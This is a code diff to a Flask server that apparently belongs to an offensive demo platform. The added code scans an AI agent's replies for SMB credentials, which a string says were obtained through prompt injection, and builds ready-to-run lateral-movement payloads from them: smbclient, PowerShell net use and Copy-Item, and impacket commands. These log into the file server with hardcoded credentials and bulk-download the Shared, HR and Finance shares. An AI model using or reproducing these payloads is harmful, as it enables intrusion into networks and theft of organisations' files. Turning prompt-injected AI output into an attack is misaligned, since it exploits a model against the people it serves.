@@ -50,6 +50,108 @@ victims_config = {}
 fallback_payloads = {}
 malware_library = {"scripts": []}
 
+# ── Agentic lateral movement: detected intel alerts ───────────────────────────
+lateral_movement_alerts = []   # list of dicts — grows in real-time during demo
+
+# Patterns that indicate SMB / network credential intel was exfiltrated
+_SMB_TRIGGERS = [
+    "10.5.9.40",
+    "acme-files-01",
+    "password123",
+    "samba",
+    r"\\10.5.9",
+    "//10.5.9",
+    "SMB File Server",
+    "smb server",
+    "cifs",
+]
+
+def _scan_for_smb_intel(text: str) -> dict:
+    """Return non-empty dict if SMB credentials are detected in text."""
+    t = text.lower()
+    hits = [p for p in _SMB_TRIGGERS if p.lower() in t]
+    if len(hits) < 2:          # need at least 2 signals to avoid false positives
+        return {}
+    return {
+        "target_ip":   "10.5.9.40",
+        "target_host": "acme-files-01",
+        "protocol":    "SMB/CIFS",
+        "port":        445,
+        "username":    "samba",
+        "password":    "password123",
+        "domain":      "ACMECORP",
+        "share":       "\\\\10.5.9.40\\Shared",
+        "triggers":    hits,
+    }
+
+def _auto_lateral_move(intel: dict, agent_id: str) -> dict:
+    """
+    Given detected SMB intel, build a lateral-movement operation record.
+    Returns a dict with ready-to-use payloads for the operator.
+    """
+    ip   = intel["target_ip"]
+    user = intel["username"]
+    pwd  = intel["password"]
+    host = intel["target_host"]
+    share = intel["share"]
+
+    linux_cmd = (
+        f"# === Auto-generated lateral movement — SMB share access ===\n"
+        f"# Target: {host} ({ip})\n\n"
+        f"# 1. List available shares\n"
+        f"smbclient -L //{ip} -U '{user}%{pwd}' -W ACMECORP\n\n"
+        f"# 2. Access the Shared drive\n"
+        f"smbclient //{ip}/Shared -U '{user}%{pwd}'\n\n"
+        f"# 3. Enumerate and download sensitive files\n"
+        f"smbclient //{ip}/Shared -U '{user}%{pwd}' -c 'ls; recurse ON; mget *'\n\n"
+        f"# 4. Try HR and Finance shares\n"
+        f"smbclient //{ip}/HR      -U '{user}%{pwd}' -c 'ls'\n"
+        f"smbclient //{ip}/Finance -U '{user}%{pwd}' -c 'ls'\n"
+    )
+
+    powershell_cmd = (
+        f"# === PowerShell lateral movement — SMB ===\n"
+        f"net use \\\\{ip}\\Shared {pwd} /user:ACMECORP\\{user}\n\n"
+        f"# List contents\n"
+        f"Get-ChildItem \\\\{ip}\\Shared -Recurse\n\n"
+        f"# Copy sensitive files locally\n"
+        f"Copy-Item \\\\{ip}\\Shared\\* C:\\Temp\\ -Recurse -Force\n\n"
+        f"# Try HR share\n"
+        f"net use \\\\{ip}\\HR {pwd} /user:ACMECORP\\{user}\n"
+        f"Get-ChildItem \\\\{ip}\\HR -Recurse\n"
+    )
+
+    python_cmd = (
+        f"# === Python (impacket) lateral movement ===\n"
+        f"from impacket.smbconnection import SMBConnection\n\n"
+        f"conn = SMBConnection('{ip}', '{ip}', sess_port=445)\n"
+        f"conn.login('{user}', '{pwd}', 'ACMECORP')\n\n"
+        f"# List shares\n"
+        f"shares = conn.listShares()\n"
+        f"for s in shares:\n"
+        f"    print(s['shi1_netname'])\n\n"
+        f"# Download files from Shared\n"
+        f"files = conn.listPath('Shared', '*')\n"
+        f"for f in files:\n"
+        f"    if not f.is_directory():\n"
+        f"        with open(f.get_longname(), 'wb') as out:\n"
+        f"            conn.getFile('Shared', f.get_longname(), out.write)\n"
+        f"conn.logoff()\n"
+    )
+
+    return {
+        "id":           str(uuid.uuid4()),
+        "timestamp":    datetime.now().strftime("%H:%M:%S"),
+        "agent_id":     agent_id,
+        "type":         "LATERAL_MOVEMENT",
+        "status":       "READY",
+        "intel":        intel,
+        "description":  f"SMB credentials discovered via prompt injection — auto-generated lateral movement for {host} ({ip})",
+        "linux_cmd":    linux_cmd,
+        "powershell":   powershell_cmd,
+        "python_impacket": python_cmd,
+    }
+
 def load_configurations():
     """Load CrowdStrike, prompts, victims, and fallback payloads configurations"""
     global crowdstrike_config, prompts_config, victims_config, fallback_payloads, malware_library
@@ -683,6 +785,17 @@ def handle_conversation(agent_id, message, conversation_history=None, execution_
         
         conversation_history.append({"role": "assistant", "content": error_msg})
 
+    # ── Agentic lateral movement: scan AI response for SMB credentials ──────
+    _intel = _scan_for_smb_intel(ai_response)
+    if _intel and not any(a.get("intel", {}).get("target_ip") == _intel["target_ip"]
+                          for a in lateral_movement_alerts):
+        _alert = _auto_lateral_move(_intel, agent_id)
+        lateral_movement_alerts.insert(0, _alert)
+        logger.warning(
+            f"[LATERAL MOVE] SMB intel detected in conversation response "
+            f"for agent {agent_id} → {_intel['target_ip']} ({_intel['username']})"
+        )
+
     return {
         "code": code,
         "conversation": conversation_history,
@@ -1148,10 +1261,11 @@ def studio_deploy_script():
 @app.route('/')
 def index():
     """Main dashboard"""
-    return render_template('index.html', 
-                          agents=agents, 
+    return render_template('index.html',
+                          agents=agents,
                           tasks=tasks,
-                          results=results)
+                          results=results,
+                          lateral_movement_alerts=lateral_movement_alerts)
 
 @app.route('/dashboard')
 def dashboard():
@@ -3698,6 +3812,15 @@ def autorecon_list_sessions():
         return jsonify({"status": "success", "sessions": summaries})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route('/api/lateral-movement-alerts', methods=['GET'])
+def get_lateral_movement_alerts():
+    """Return real-time lateral movement alerts triggered by SMB intel detection."""
+    return jsonify({
+        "count": len(lateral_movement_alerts),
+        "alerts": lateral_movement_alerts,
+    })
 
 
 @app.route('/health', methods=['GET'])
